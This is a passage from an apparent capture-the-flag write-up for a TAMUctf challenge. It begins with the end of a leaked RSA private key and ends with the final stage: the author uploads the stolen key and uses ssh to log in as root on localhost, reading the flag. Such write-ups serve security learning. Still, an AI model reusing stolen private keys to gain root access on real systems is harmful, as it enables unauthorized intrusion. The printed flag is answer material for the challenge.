    rOkuhyPMG4r6lVPW7DY5cD0p3bQW4eZIgKnKiG5BrIdhrElYQvONtOsoymJuW31n
    mve3XZ8kIyyq0B+bI3gYGoCk6W1+mqtAk5HRR8WHeGj2aBCEv4NX3fgdWeH3q4HC
    lD2Iu6ECgYAKsySIrKyakvNLrrr/s3/TpHpFG8kOoITz4LoQZsP0XzSpCIrfATfn
    /hgFagelP1+rb+vhv3YoScpMxyYVP1UDcGlSXMytWX8zdJ5urcTMY0GYcmHShLBi
    26rkzZtvCM7piLFGPbpD40BXMbagzf2I5G1uXExEXpDrk+gOxNcULw==
    -----END RSA PRIVATE KEY-----

### Fourth Stage - End Game

As you already know, tamuctf has really strict internet. We can't directly access port 22, but we can do ssh from inside the box. So, the path is clear, upload the private key and execute ssh with the uploaded private key.

```
$ ssh -o StrictHostKeyChecking=no -i priv root@localhost
# cat f*
gigem{wh0_541d_py7h0n_c4n7_b3_b1n4ry}
```